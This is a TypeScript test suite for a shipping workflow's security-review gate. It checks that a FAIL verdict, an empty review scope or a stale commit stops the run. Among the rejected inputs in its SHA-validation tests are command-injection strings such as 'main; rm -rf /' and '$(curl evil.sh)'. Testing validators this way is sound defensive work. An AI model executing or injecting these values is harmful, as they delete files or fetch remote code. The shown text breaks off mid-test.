import { describe, expect, test } from "bun:test";
import { readFileSync } from "fs";
import { join } from "path";

import { assertMarkedBlockReachable } from "../lib/reachability";
import type { ReReviewDecision } from "../lib/security-verdict";
import {
  RE_REVIEW,
  REVIEW_CURRENT,
  SECURITY_REREVIEW_EXHAUSTED,
  reReviewDecision,
  reviewIsCurrent,
  rookGateVerdict,
  rookReviewSha,
  rookScopeCommand,
} from "../lib/security-verdict";

/**
 * #129 — the security review can now fail a run.
 *
 * Measured twice in production before this existed: rook returned
 * `{"result":"FAIL"}` with a reproduced HIGH guard bypass, and ship.js
 * returned SHIPPED and opened a PR. The verdict was computed, logged, graded —
 * and read by nothing that could stop anything.
 *
 * ship.js is not importable (the Workflow sandbox has no module loading, #69),
 * so the blocks under test are extracted by marker and executed with stubs,
 * the same way test/verify-fanout.test.ts and
 * test/workflow-security-integration.test.ts do it.
 */

const REPO_ROOT = join(import.meta.dir, "..");
const SHIP_PATH = join(REPO_ROOT, "workflows", "ship.js");
const shipSource = readFileSync(SHIP_PATH, "utf-8");

/**
 * Run ship.js's security decision block with an arbitrary set of module-scope
 * names.
 *
 * `with` over a Proxy rather than a parameter list. The block reads several
 * module-scope values, and which ones is an implementation detail that moves:
 * #169 added the review-currency comparison to it, and a parameter list both
 * has to guess the new names and throws outright if the block declares one of
 * them with `const`. Unknown identifiers fall through to the real globals, so
 * `JSON`, `String` and friends still resolve, and a name nothing supplies is
 * `undefined` — which throws where it is used rather than passing quietly.
 *
 * The block ends in `return { status: 'SHIP_FAILED', ... }` on a refusal and
 * falls through to undefined when the run may proceed.
 */
function runDecisionBlock(scope: Record<string, unknown>) {
  return runMarkedBlock(sliceBlock(DECISION_START, DECISION_END), scope);
}

/**
 * Execute one marker-delimited region of ship.js over a sandbox.
 *
 * Shared by the Verify-side decision block and the Ship-round refusal, which
 * are two copies of the same decision at two points in the file and so have to
 * be exercised the same way — a Ship-round test that stubbed its own runner
 * could agree with a block production never reaches.
 */
function runMarkedBlock(block: string, scope: Record<string, unknown>) {
  const sandbox = new Proxy(scope, {
    has: () => true,
    get: (target, key) => {
      if (key === Symbol.unscopables) return undefined;
      return key in target
        ? target[key as string]
        : (globalThis as unknown as Record<string, unknown>)[key as string];
    },
  });
  const factory = new Function(
    "__scope__",
    `return (async function () { with (__scope__) {\n${block}\nreturn undefined\n} })()`,
  );
  return factory(sandbox) as Promise<Record<string, unknown> | undefined>;
}

/**
 * The names the decision block reads, defaulting to a run that may ship: a
 * passing verify, a passing security verdict, and a review pinned to the
 * commit the branch ends at. A test about one of those sets only that one, so
 * it is never also quietly asserting something else.
 *
 * `tested`/`head` drive the review-currency inputs under every name the block
 * could reasonably read them by, all consistent with each other, so this
 * harness does not pin ship.js's choice of local variable.
 */
function decisionScope(
  logs: string[],
  overrides: { tested?: unknown; head?: unknown } & Record<string, unknown> = {},
): Record<string, unknown> {
  const tested = "tested" in overrides ? overrides.tested : SHA;
  const head = "head" in overrides ? overrides.head : SHA;
  const rest = { ...overrides };
  delete rest.tested;
  delete rest.head;
  const currency = inlinedReviewIsCurrent(tested, head);
  return {
    log: (m: unknown) => logs.push(String(m)),
    verifyResult: { result: "PASS" },
    securityVerdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
    shipBranch: "169-deep-modules",
    ISSUE: 169,
    SLUG: "pai-harness-169",
    WORK_DIR: "/tmp/work",
    reviewIsCurrent: inlinedReviewIsCurrent,
    reviewCurrency: currency,
    securityCurrency: currency,
    currency,
    testedSha: tested,
    headSha: head,
    reviewSha: tested,
    buildCommit: head,
    // #171's names. The budget DEFAULTS TO ZERO so the #169 cases above keep
    // asking what they have always asked — "the review is stale and nothing
    // can be done about it, now what" — and the #171 cases set a budget
    // explicitly. The re-review spawner throws rather than returning a verdict,
    // so a case that re-reviews without meaning to fails loudly instead of
    // passing through a stub it never intended to exercise.
    ...inlinedReReview,
    rookReviewSha: inlined.rookReviewSha,
    MAX_SECURITY_REREVIEWS: 0,
    runRookReview: () => {
      throw new Error("the decision block spawned a re-review this test did not ask for");
    },
    recordExhaustedSecurityReview: () => {
      throw new Error("the decision block recorded exhaustion this test did not ask for");
    },
    ...rest,
  };
}

function sliceBlock(startMarker: string, endMarker: string): string {
  const start = shipSource.indexOf(startMarker);
  const end = shipSource.indexOf(endMarker);
  if (start === -1 || end === -1) {
    throw new Error(`ship.js is missing the ${startMarker} / ${endMarker} markers`);
  }
  return shipSource.slice(start + startMarker.length, end);
}

const SECURITY_START = "// ──── ROOK-SECURITY-START ────";
const SECURITY_END = "// ──── ROOK-SECURITY-END ────";
const DECISION_START = "// ──── SECURITY-DECISION-START ────";
const DECISION_END = "// ──── SECURITY-DECISION-END ────";
const FANOUT_START = "// ──── VERIFY-FANOUT-START ────";
const FANOUT_END = "// ──── VERIFY-FANOUT-END ────";
const CURRENCY_START = "// ──── REVIEW-CURRENCY-START ────";
const CURRENCY_END = "// ──── REVIEW-CURRENCY-END ────";
const STALE_REFUSAL_START = "// ──── STALE-REFUSAL-START ────";
const STALE_REFUSAL_END = "// ──── STALE-REFUSAL-END ────";

/**
 * The Ship-round refusal, extracted at module scope on purpose.
 *
 * If the markers go missing, `sliceBlock` throws here and every test in this
 * file fails to load, the same way `inlinedReviewIsCurrent` does. Resolving it
 * lazily inside the tests would turn "ship.js lost its second currency check"
 * into a quiet green run — the shape
 * .claude/rules/checks-must-be-able-to-fail.md is about.
 */
const STALE_REFUSAL_BLOCK = sliceBlock(STALE_REFUSAL_START, STALE_REFUSAL_END);

/** The inlined copies ship.js actually runs. */
const inlined = new Function(
  `${sliceBlock(SECURITY_START, SECURITY_END)}
   return { rookReviewSha, rookScopeCommand, rookGateVerdict }`,
)() as {
  rookReviewSha: typeof rookReviewSha;
  rookScopeCommand: typeof rookScopeCommand;
  rookGateVerdict: typeof rookGateVerdict;
};

/**
 * ship.js's inlined `reviewIsCurrent`, extracted by marker.
 *
 * Module scope on purpose: if the REVIEW-CURRENCY markers are not in ship.js,
 * `sliceBlock` throws here and every test in this file fails to load. The
 * alternative — resolving the copy lazily and skipping when it is absent —
 * would turn "ship.js lost its staleness check" into a quiet green run, which
 * is the exact shape .claude/rules/checks-must-be-able-to-fail.md is about.
 *
 * The copy is compiled against the ROOK-SECURITY block because it calls
 * `rookReviewSha`, which lives there. When the currency block is nested inside
 * ROOK-SECURITY the security block already carries it; when it is a separate
 * region it is compiled in a nested function scope, so its own `const` and
 * `function` declarations cannot collide with the security block's while still
 * closing over them.
 */
const inlinedReviewIsCurrent: typeof reviewIsCurrent = (() => {
  const securityBlock = sliceBlock(SECURITY_START, SECURITY_END);
  const currencyBlock = sliceBlock(CURRENCY_START, CURRENCY_END);
  const body = securityBlock.includes(currencyBlock)
    ? `${securityBlock}\nreturn reviewIsCurrent`
    : `${securityBlock}\nreturn (function () {${currencyBlock}\nreturn reviewIsCurrent})()`;
  const fn = new Function(body)();
  if (typeof fn !== "function") {
    throw new Error(
      "ship.js's REVIEW-CURRENCY block does not define reviewIsCurrent — " +
        "the agreement matrix below would be comparing nothing",
    );
  }
  return fn as typeof reviewIsCurrent;
})();

/**
 * ship.js's inlined #171 decision and its three verdict constants, extracted
 * from the same marked region, for the same reason as `inlinedReviewIsCurrent`
 * above: if the block stops defining them, this file fails to load rather than
 * reporting a quiet green over a workflow that lost its re-review path.
 *
 * Spread into the decision block's scope by `decisionScope`, so the block is
 * executed against the constants ship.js actually declares — a test that
 * supplied its own `RE_REVIEW` string could agree with a block that spells it
 * differently.
 */
const inlinedReReview = (() => {
  const securityBlock = sliceBlock(SECURITY_START, SECURITY_END);
  const currencyBlock = sliceBlock(CURRENCY_START, CURRENCY_END);
  const names = "{ reReviewDecision, REVIEW_CURRENT, RE_REVIEW, SECURITY_REREVIEW_EXHAUSTED }";
  const body = securityBlock.includes(currencyBlock)
    ? `${securityBlock}\nreturn ${names}`
    : `${securityBlock}\nreturn (function () {${currencyBlock}\nreturn ${names}})()`;
  const out = new Function(body)() as {
    reReviewDecision: typeof reReviewDecision;
    REVIEW_CURRENT: string;
    RE_REVIEW: string;
    SECURITY_REREVIEW_EXHAUSTED: string;
  };
  if (typeof out.reReviewDecision !== "function") {
    throw new Error(
      "ship.js's REVIEW-CURRENCY block does not define reReviewDecision — " +
        "the re-review path below would be testing nothing",
    );
  }
  for (const [name, value] of Object.entries(out)) {
    if (name === "reReviewDecision") continue;
    if (typeof value !== "string" || value === "") {
      throw new Error(`ship.js's inlined ${name} is not a verdict constant`);
    }
  }
  return out;
})();

const SHA = "3192a75c4f1e2b8d9a0c5e6f7081a2b3c4d5e6f7";
/** A different real commit — the #164 branch tip. */
const OTHER_SHA = "ef998b73c4f1e2b8d9a0c5e6f7081a2b3c4d5e6f";
const GOOD_SCOPE = { exitCode: 0, files: ["workflows/ship.js", "lib/security-verdict.ts"] };

// ── AC-1 ────────────────────────────────────────────────────────────────

describe("AC-1: a rook FAIL stops the run", () => {
  /**
   * Execute the decision block with the module-scope names ship.js gives it,
   * over a review that is current — so these tests are about the rook verdict
   * and nothing else. Staleness has its own describe below.
   */
  function decide(opts: {
    verifyResult: unknown;
    securityVerdict: { spawned: boolean; verdict: string; failures: string[] };
  }) {
    const logs: string[] = [];
    const result = runDecisionBlock(
      decisionScope(logs, {
        verifyResult: opts.verifyResult,
        securityVerdict: opts.securityVerdict,
        shipBranch: "129-deep-modules",
        ISSUE: 129,
        SLUG: "pai-harness-129",
      }),
    );
    return { result, logs };
  }

  const PASSING = { spawned: true, verdict: "PASS", failures: [] as string[] };

  test("rook FAIL returns SHIP_FAILED", async () => {
    const { result, logs } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: {
        spawned: true,
        verdict: "FAIL",
        failures: ["guard bypass in gates/run-gate.ts:120"],
      },
    });
    const out = await result;
    expect(out?.status, "a FAIL security verdict let the run continue").toBe("SHIP_FAILED");
    expect(String(out?.reason)).toContain("guard bypass in gates/run-gate.ts:120");
    expect(logs.some(l => /guard bypass in gates\/run-gate\.ts:120/.test(l))).toBe(true);
  });

  test("the verdict object travels with the refusal", async () => {
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: { spawned: true, verdict: "FAIL", failures: ["x"] },
    });
    const out = await result;
    expect((out?.security as Record<string, unknown>)?.verdict).toBe("FAIL");
    expect(out?.issue).toBe(129);
  });

  test("a PASS verdict falls through so the run can continue", async () => {
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: PASSING,
    });
    expect(await result, "a passing security review stopped the run").toBeUndefined();
  });

  test("the fail-closed default blocks a run where security never ran", async () => {
    // ship.js's REAL initialiser, executed — not a value this test made up.
    // If the fan-out throws, or a future edit forgets to assign it, this is
    // what the decision point sees, and it must refuse. Asserting a
    // hand-written copy here would pass even if ship.js initialised to PASS.
    const initialiser = new Function(
      `${sliceBlock("// ──── SECURITY-DEFAULT-START ────", "// ──── SECURITY-DEFAULT-END ────")}
       return securityVerdict`,
    )() as { spawned: boolean; verdict: string; failures: string[] };

    expect(initialiser.verdict, "ship.js starts the run with security already passed").toBe("FAIL");
    expect(initialiser.spawned).toBe(false);
    expect(initialiser.failures.length).toBeGreaterThan(0);

    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: initialiser,
    });
    expect((await result)?.status).toBe("SHIP_FAILED");
  });

  test("the decision reads verifyResult at the same point", () => {
    // AC-1 places the security decision beside the verify decision rather than
    // in a second, later place that a future edit could return before.
    const block = sliceBlock(DECISION_START, DECISION_END);
    expect(block).toContain("verifyResult?.result");
    expect(block).toContain("securityVerdict");
  });

  test("no PR step is invoked after the refusal", () => {
    // Structural, because the PR step is 170 lines further down and cannot be
    // stubbed into the extracted block: assert the refusal's `return` comes
    // first in the file, so nothing between it and the PR step can run.
    const refusal = shipSource.indexOf(DECISION_END);
    const prStep = shipSource.indexOf("record-env-and-pr");
    expect(prStep, "the PR step label moved — this guard no longer checks anything")
      .toBeGreaterThan(-1);
    expect(
      refusal,
      "the security decision now happens AFTER the PR is opened, which is the bug",
    ).toBeLessThan(prStep);
  });

  /**
   * #201. Every check above is blind to whether the decision block RUNS.
   * `sliceBlock` returns the text between the markers and the two structural
   * tests compare byte offsets, so wrapping the marked region in
   * `if (false)` — wrapper outside the marker comments — leaves the slice
   * byte-identical and the offsets in the same order. Measured on 2026-10-08:
   * that mutation left this file at 113 pass / 0 fail with the security gate
   * switched off.
   *
   * The ancestor chain is read off the parse: `["Program"]` means the block is
   * a statement of the module body, which ship.js executes top to bottom. Any
   * conditional owner — `if`, loop, `catch`, function — appears in the chain
   * under its own type and is refused.
   */
  test("the decision block is reachable — it sits at module top level, not inside a conditional", () => {
    expect(assertMarkedBlockReachable(shipSource, "SECURITY-DECISION")).toEqual(["Program"]);
  });
});

// ── AC-2 ────────────────────────────────────────────────────────────────

describe("AC-2: the review scope is the commit SHA", () => {
  test("review scope is the commit SHA, not a worktree's HEAD", async () => {
    const prompts = await runFanoutPrompts();
    const rookPrompt = prompts.find(p => /Security review/.test(p)) || "";
    expect(rookPrompt, "rook's prompt does not name the commit under review").toContain(SHA);
    expect(
      rookPrompt,
      "rook is still scoped to origin/main...HEAD of whatever worktree it was given — " +
        "that diff was EMPTY on both production runs",
    ).not.toContain("origin/main...HEAD");
  });

  test("the scope command pins git to the workflow-supplied SHA", () => {
    const cmd = rookScopeCommand("/p", "/h", SHA, "/w/scope.json");
    expect(cmd).toContain(`--sha ${SHA}`);
    expect(cmd).toContain("/h/scripts/rook-review-scope.ts");
    expect(cmd).toContain(`--out ${shellQuote("/w/scope.json")}`);
    // A path with a space is the case unquoted interpolation breaks on first,
    // and it needs no attacker — PROJECT_ROOT is wherever the repo is checked
    // out. Asserted against shellQuote's own output so the expectation tracks
    // ship.js's quoting rather than restating it.
    const spaced = rookScopeCommand("/My Projects/p", "/h", SHA, "/w/s.json");
    expect(spaced).toContain(`--project ${shellQuote("/My Projects/p")}`);
    expect(spaced).toContain(`cd ${shellQuote("/My Projects/p")}`);
  });

  test("rookReviewSha accepts a SHA and refuses anything else", () => {
    expect(rookReviewSha("3192a75")).toBe("3192a75");
    expect(rookReviewSha("3192A75")).toBe("3192a75");
    expect(rookReviewSha(" 3192a75 ")).toBe("3192a75");
    for (const bad of ["HEAD", "main", "abc", "", null, undefined, 42, {}, "3192a75; rm -rf /"]) {
      expect(rookReviewSha(bad), `${JSON.stringify(bad)} was accepted as a review SHA`).toBeNull();
    }
  });

  test("the scope command refuses to be built from a non-SHA", () => {
    for (const bad of ["HEAD", "main; rm -rf /", "", "$(curl evil.sh)"]) {
      expect(() => rookScopeCommand("/p", "/h", bad, "/w/s.json")).toThrow(/not a commit SHA/i);
    }
  });
});

// ── AC-3 / AC-6 ─────────────────────────────────────────────────────────

describe("AC-3: an empty scope blocks the run", () => {
  test("empty scope blocks even when rook returns PASS", () => {
    const v = rookGateVerdict({ exitCode: 0, files: [] }, { result: "PASS" });
    expect(v.verdict, "rook reviewed nothing and the run was allowed to proceed").toBe("FAIL");
    expect(v.failures.join(" ")).toMatch(/empty/i);
  });

  test("a non-empty scope with a rook PASS is the only way through", () => {
    expect(rookGateVerdict(GOOD_SCOPE, { result: "PASS" })).toEqual({
      spawned: true,
      verdict: "PASS",
      failures: [],
    });
  });

  test("the scope script itself refuses an empty diff", () => {
    // The other half: the workflow-side check above is only meaningful if the
    // script can actually produce exitCode != 0. Covered end-to-end against a
    // real git repository in test/rook-review-scope.test.ts.
    const scopeSource = readFileSync(join(REPO_ROOT, "scripts", "rook-review-scope.ts"), "utf-8");
    expect(scopeSource).toContain("REFUSE_EXIT");
  });
});

describe("AC-6: the scope determination fails closed", () => {
  const MALFORMED: Array<[string, unknown]> = [
    ["nothing at all", undefined],
    ["null", null],
    ["a string instead of a report", "ok"],
    ["a report with no exitCode", { files: ["a.ts"] }],
    ["a non-zero exitCode", { exitCode: 1, files: ["a.ts"] }],
    ["exitCode as a string", { exitCode: "0", files: ["a.ts"] }],
    ["files missing", { exitCode: 0 }],
    ["files null", { exitCode: 0, files: null }],
    ["files as a string", { exitCode: 0, files: "a.ts" }],
    ["files as an object", { exitCode: 0, files: { 0: "a.ts" } }],
    ["files empty", { exitCode: 0, files: [] }],
    // A list whose entries are not usable paths is the same absence of a
    // reviewed scope as an empty list, and `files.length` cannot tell them
    // apart. Found by security review of this change: the earlier draft
    // filtered to non-blank strings before counting and this one dropped it,
    // which is a fail-open inside a function whose contract is to fail closed
    // everywhere.
    ["files containing only an empty string", { exitCode: 0, files: [""] }],
    ["files containing only whitespace", { exitCode: 0, files: ["   ", "\t"] }],
    ["files containing nulls", { exitCode: 0, files: [null, null] }],
    ["files containing numbers", { exitCode: 0, files: [1, 2] }],
    ["files containing nested arrays", { exitCode: 0, files: [["a.ts"]] }],
  ];

  for (const [label, scope] of MALFORMED) {
    test(`fails closed on a malformed scope report — ${label}`, () => {
      const v = rookGateVerdict(scope, { result: "PASS" });
      expect(
        v.verdict,
        `${label} was treated as a successful non-empty scope`,
      ).toBe("FAIL");
      expect(v.failures.length).toBeGreaterThan(0);
    });
  }

  test("a usable path beside an unusable one is still a scope", () => {
    // The positive control for the filter above. A stricter rule — "every
    // entry must be a non-blank string" — would reject this, and then the
    // whole matrix would pass for a reason that has nothing to do with
    // emptiness. git produces clean paths; the filter exists to stop a
    // report of nothing from counting as a report of something.
    const v = rookGateVerdict({ exitCode: 0, files: ["", "lib/a.ts"] }, { result: "PASS" });
    expect(v.verdict).toBe("PASS");
  });

  test("a missing rook result is a FAIL, not a skip", () => {
    for (const rook of [undefined, null, {}, { result: "MAYBE" }, { result: "SKIP" }]) {
      const v = rookGateVerdict(GOOD_SCOPE, rook);
      expect(v.verdict, `rook returning ${JSON.stringify(rook)} was treated as a pass`).toBe("FAIL");
    }
  });

  test("a rook FAIL with no detail still names something actionable", () => {
    // gates/SCHEMA-GUIDE.md: a FAIL verdict must carry a non-empty failures
    // list. A FAIL nobody can act on blocks the run without saying what to fix.
    for (const rook of [
      { result: "FAIL" },
      { result: "FAIL", failures: [] },
      { result: "FAIL", failures: null },
      { result: "FAIL", failures: "injection in lib/a.ts" },
    ]) {
      const v = rookGateVerdict(GOOD_SCOPE, rook);
      expect(v.verdict).toBe("FAIL");
      expect(v.failures.length, JSON.stringify(rook)).toBeGreaterThan(0);
      for (const f of v.failures) expect(typeof f).toBe("string");
    }
  });

  test("rook's own failure strings are carried through", () => {
    const v = rookGateVerdict(GOOD_SCOPE, {
      result: "FAIL",
      failures: ["secret logged at gates/run-gate.ts:120", "unvalidated path join"],
    });
    expect(v.failures).toEqual([
      "secret logged at gates/run-gate.ts:120",
      "unvalidated path join",
    ]);
  });

  test("spawned reflects whether rook actually returned anything", () => {
    expect(rookGateVerdict(GOOD_SCOPE, null).spawned).toBe(false);
    expect(rookGateVerdict(GOOD_SCOPE, { result: "PASS" }).spawned).toBe(true);
  });
});

// ── AC-4 ────────────────────────────────────────────────────────────────

describe("AC-4: the verdict is recorded in workflow-state.json", () => {
  test("records the security verdict in workflow-state", async () => {
    // The write itself is exercised end-to-end against a real file in
    // test/record-security-verdict.test.ts. What this asserts is the half that
    // lives in the workflow: the recorder is invoked, pointed at this run's
    // state file, and told the verdict the WORKFLOW computed — not one an
    // agent restated back.
    const { done, prompts } = runFanout({
      rook: { result: "FAIL", failures: ["guard bypass"] },
    });
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    expect(record, "nothing in the fan-out records the verdict").not.toBe("");
    expect(record).toContain(`--state ${shellQuote("/tmp/work/workflow-state.json")}`);
    expect(record).toContain(`--verdict ${shellQuote("FAIL")}`);
    expect(record).toContain(`--spawned ${shellQuote("true")}`);
    expect(record).toContain(`--findings ${shellQuote("/tmp/work/rook-findings.json")}`);
  });

  test("every path in the record command is shell-quoted", async () => {
    // Not because any of these is agent-reported — they are workflow
    // arguments — but because ship.js:377 is the record of an unquoted path
    // that was safe until what fed it changed, and a project root containing
    // a space is the ordinary case that breaks first. Written against
    // shellQuote's output rather than a literal `'`, so the assertion follows
    // the quoting ship.js actually uses.
    const { done, prompts } = runFanout();
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    for (const flag of ["--state", "--findings", "--scope", "--verdict", "--spawned"]) {
      const value = record.match(new RegExp(`${flag} (\\S+)`))?.[1];
      expect(value, `${flag} is missing from the record command`).toBeDefined();
      expect(value!.startsWith("'") && value!.endsWith("'"), `${flag} ${value} is unquoted`).toBe(true);
    }
  });

  test("the recorded verdict is the workflow's, not rook's bare answer", async () => {
    // rook says PASS; the scope was empty, so the run is a FAIL and the
    // artefact must say FAIL. A record that echoed rook would claim this run
    // was security-reviewed when it reviewed nothing.
    const { done, prompts } = runFanout({
      rook: { result: "PASS" },
      scope: { exitCode: 0, files: [] },
    });
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    expect(record).toContain(`--verdict ${shellQuote("FAIL")}`);
  });

  test("the record step runs for a PASS as well as a FAIL", async () => {
    const { done, labels } = runFanout({ rook: { result: "PASS" } });
    await done;
    expect(
      labels,
      "a passing review leaves no record, so the artefact cannot say security ran",
    ).toContain("record-security");
  });

  test("the record step runs when rook FAILs", async () => {
    const { done, labels } = runFanout({ rook: { result: "FAIL", failures: ["boom"] } });
    await done;
    expect(labels).toContain("record-security");
  });

  test("agents.rook.failures survives the schema", async () => {
    // Zod strips undeclared keys. Without `failures` on AgentSchema a rook FAIL
    // round-trips as a verdict with no reasons attached.
    const { WorkflowStateSchema } = await import("../gates/schema");
    const parsed = WorkflowStateSchema.partial().safeParse({
      agents: {
        rook: { spawned: true, verdict: "FAIL", failures: ["a", "b"] },
      },
    });
    expect(parsed.success, JSON.stringify((parsed as { error?: unknown }).error)).toBe(true);
    expect(
      (parsed as { data: { agents: { rook: { failures?: string[] } } } }).data.agents.rook.failures,
    ).toEqual(["a", "b"]);
  });

  test("agents.rook.failures rejects a bare string", async () => {
    const { WorkflowStateSchema } = await import("../gates/schema");
    const parsed = WorkflowStateSchema.partial().safeParse({
      agents: { rook: { spawned: true, verdict: "FAIL", failures: "one long prose blob" } },
    });
    expect(parsed.success).toBe(false);
  });
});

// ── AC-5 ────────────────────────────────────────────────────────────────

describe("AC-5: the standard no longer makes security conditional on size", () => {
  const spec = readFileSync(join(REPO_ROOT, "specs", "HARNESS-STANDARD.md"), "utf-8");

  for (const [label, pattern] of [
    ["the §5 process list", /If M\+ size .*Rook/],
    ["the Quality bar line", /Rook PASS if M\+/],
    ["the VERIFICATION mermaid node", /Rook security \(if M\+\)/],
    ["the phase table", /Quinn\/Rook conditional/],
  ] as Array<[string, RegExp]>) {
    test(`${label} no longer gates the security review on size`, () => {
      expect(spec.match(new RegExp(pattern, "g")) || []).toEqual([]);
    });
  }

  test("the standard still mentions the security review at all", () => {
    // The over-fix guard: deleting every mention of Rook would satisfy the four
    // assertions above while removing the requirement entirely.
    expect(spec).toMatch(/Rook/);
    expect(spec).toMatch(/every (build )?cycle|always/i);
  });
});

// ── the inlined copy must not drift from the library ────────────────────

describe("ship.js's inlined helpers match lib/security-verdict.ts", () => {
  // Same reasoning as test/workflow-security-integration.test.ts AC-4: ship.js
  // cannot import, so it carries copies, and a copy that has drifted is how a
  // fix lands in one place and not the other. computeACHash already did this
  // once in this repo — the lib sorted its input and the inline copy did not.

  test("rookReviewSha agrees on every input", () => {
    for (const v of ["3192a75", "3192A75", " abc1234 ", "HEAD", "", null, undefined, 7, {}, []]) {
      expect(inlined.rookReviewSha(v), JSON.stringify(v)).toEqual(rookReviewSha(v));
    }
  });

  test("rookScopeCommand agrees", () => {
    expect(inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json")).toBe(
      rookScopeCommand("/p", "/h", SHA, "/w/s.json"),
    );
    expect(() => inlined.rookScopeCommand("/p", "/h", "HEAD", "/w/s.json")).toThrow();
  });

  test("rookGateVerdict agrees on every scope/rook pair", () => {
    const scopes: unknown[] = [
      undefined, null, "ok", {}, { exitCode: 0 }, { exitCode: 1, files: ["a"] },
      { exitCode: 0, files: [] }, { exitCode: 0, files: "a" }, GOOD_SCOPE,
    ];
    const rooks: unknown[] = [
      undefined, null, {}, { result: "PASS" }, { result: "FAIL" },
      { result: "FAIL", failures: ["a", "b"] }, { result: "SKIP" },
    ];
    for (const s of scopes) {
      for (const r of rooks) {
        expect(
          inlined.rookGateVerdict(s, r),
          `drift at scope=${JSON.stringify(s)} rook=${JSON.stringify(r)}`,
        ).toEqual(rookGateVerdict(s, r));
      }
    }
  });
});

// ── #169 ────────────────────────────────────────────────────────────────

/**
 * The one input matrix. Every #169 test below — the library, ship.js's inlined
 * copy, and the parity comparison between them — runs over this, so "the two
 * agree" cannot be satisfied by the two being asked different questions.
 *
 * `current` is the expected answer, and the positive rows matter as much as
 * the negative ones: a `reviewIsCurrent` that returned `false` unconditionally
 * would satisfy every refusal case in the file.
 */
const CURRENCY_MATRIX: Array<[string, unknown, unknown, boolean]> = [
  ["the same full SHA", SHA, SHA, true],
  ["head abbreviates tested", SHA, SHA.slice(0, 8), true],
  ["tested abbreviates head", SHA.slice(0, 8), SHA, true],
  ["the same SHA in different case", SHA.toUpperCase(), SHA, true],
  ["the same SHA with whitespace", ` ${SHA} `, SHA, true],
  // The #164 run, exactly: a real review, pinned to a commit the remediation
  // round replaced. 236 insertions and 254 deletions across all four reviewed
  // files, and nothing compared the two values.
  ["the #164 mismatch", "3fe336f1", OTHER_SHA, false],
  ["two different full SHAs", SHA, OTHER_SHA, false],
  ["a short prefix that is not shared", SHA.slice(0, 7), OTHER_SHA.slice(0, 7), false],
  ["tested missing", undefined, SHA, false],
  ["tested null", null, SHA, false],
  ["tested is a ref name", "HEAD", SHA, false],
  ["tested is empty", "", SHA, false],
  ["tested is a number", 42, SHA, false],
  ["tested is an object", {}, SHA, false],
  ["tested carries a command", "3192a75; rm -rf /", SHA, false],
  ["head missing", SHA, undefined, false],
  ["head null", SHA, null, false],
  ["head is a ref name", SHA, "HEAD", false],
  ["head is empty", SHA, "", false],
  ["head is an array", SHA, [SHA], false],
  ["both missing", undefined, undefined, false],
  ["both malformed", "HEAD", "main", false],
];

describe("#169 stale commit: a review pinned to a superseded commit is not current", () => {
  for (const [label, tested, head, expected] of CURRENCY_MATRIX) {
    test(`${label} → ${expected ? "current" : "stale"}`, () => {
      const lib = reviewIsCurrent(tested, head);
      expect(lib.current, `${label}: the library read this as ${lib.current}`).toBe(expected);
      // A refusal that cannot say why is a refusal nobody can act on. And a
      // `reason` on a PASS would let a caller that checks truthiness of the
      // reason refuse a current review.
      if (expected) {
        expect(lib.reason, `${label}: a current review carried a reason`).toBeNull();
      } else {
        expect(typeof lib.reason, `${label}: a stale review carried no reason`).toBe("string");
        expect(lib.reason!.length).toBeGreaterThan(0);
      }
    });
  }

  test("the refusal names both commits, so it says what was reviewed and what shipped", () => {
    const r = reviewIsCurrent("3fe336f1", OTHER_SHA);
    expect(r.current).toBe(false);
    expect(r.reason).toContain("3fe336f1");
    expect(r.reason).toContain(OTHER_SHA.toLowerCase());
  });

  test("nothing here throws — a throw on this path is a refusal the caller can swallow", () => {
    for (const bad of [Symbol.iterator, () => {}, new Date(), NaN, Infinity]) {
      expect(() => reviewIsCurrent(bad as unknown, SHA)).not.toThrow();
      expect(() => reviewIsCurrent(SHA, bad as unknown)).not.toThrow();
    }
  });

  test("it is built on rookReviewSha rather than a second SHA rule", () => {
    // The brief's reason for putting this beside rookReviewSha: two different
    // notions of "is this a SHA" in one file is how the pair drifts. Anything
    // rookReviewSha refuses must be stale, in both positions.
    for (const bad of ["HEAD", "main", "abc", "", "3192a75; rm -rf /"]) {
      expect(rookReviewSha(bad)).toBeNull();
      expect(reviewIsCurrent(bad, SHA).current, `${bad} was accepted as a tested SHA`).toBe(false);
      expect(reviewIsCurrent(SHA, bad).current, `${bad} was accepted as a head SHA`).toBe(false);
    }
  });
});

describe("#169 refusal path: a stale review stops the run", () => {
  test("a stale review returns SHIP_FAILED prefixed SECURITY_REVIEW_STALE", async () => {
    const logs: string[] = [];
    const out = await runDecisionBlock(
      // Everything else passes. The ONLY thing wrong with this run is that the
      // review is pinned to a commit the branch no longer ends at — which is
      // precisely the run that reported SHIPPED on #164.
      decisionScope(logs, { tested: "3fe336f1", head: OTHER_SHA }),
    );
    expect(out?.status, "a stale security review let the run reach the PR step").toBe("SHIP_FAILED");
    expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    expect(String(out?.reason)).toContain("3fe336f1");
    expect(out?.issue).toBe(169);
    expect(out?.slug).toBe("pai-harness-169");
    expect(logs.some(l => /SECURITY_REVIEW_STALE/.test(l)), "the refusal was never logged").toBe(true);
  });

  test("a missing testedSha is stale, not trusted because the verdict says PASS", async () => {
    for (const tested of [undefined, null, "", "HEAD", {}]) {
      const out = await runDecisionBlock(decisionScope([], { tested }));
      expect(out?.status, `testedSha=${JSON.stringify(tested)} was waved through`).toBe("SHIP_FAILED");
      expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    }
  });

  test("an unreadable head commit is stale too", async () => {
    for (const head of [undefined, null, "", "HEAD"]) {
      const out = await runDecisionBlock(decisionScope([], { head }));
      expect(out?.status, `headSha=${JSON.stringify(head)} was waved through`).toBe("SHIP_FAILED");
    }
  });

  test("the positive control: a current review still falls through", async () => {
    // Without this, a decision block that refused unconditionally would
    // satisfy every assertion above.
    expect(
      await runDecisionBlock(decisionScope([])),
      "a current, passing review was refused — the staleness check refuses everything",
    ).toBeUndefined();
    // And an abbreviation of the same commit is the same commit. The two
    // values arrive from different places — testedSha through an agent, the
    // head SHA from `git rev-parse` — and either may be shortened.
    expect(
